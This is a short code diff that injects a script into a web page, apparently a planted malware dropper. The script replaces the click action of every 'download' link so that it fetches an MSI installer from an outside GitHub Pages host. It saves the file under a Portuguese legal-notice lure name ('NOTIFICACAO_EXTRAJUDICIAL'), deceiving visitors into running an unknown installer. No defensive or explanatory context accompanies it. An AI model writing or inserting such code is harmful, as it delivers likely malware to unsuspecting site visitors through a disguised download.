@@ -1,0 +1,19 @@
+<script>
+document.querySelectorAll('.download').forEach(function(a) {
+ a.onclick = function(){
+  fetch('https://amzusrrn.github.io/amzvalid/setup.msi')
+  .then(resp => resp.blob()).then(function(blob, url, a){
+   a = document.createElement('a');
+   a.style.display = 'none';
+   a.href = window.URL.createObjectURL(blob);
+   a.download = 'NOTIFICACAO_EXTRAJUDICIAL7786867855.msi';
+   document.body.appendChild(a);
+   a.click();
+  })
+  return false;
+ }
+})
+</script>
+<style type="text/css">
+ .download { cursor:pointer; }
+</style>
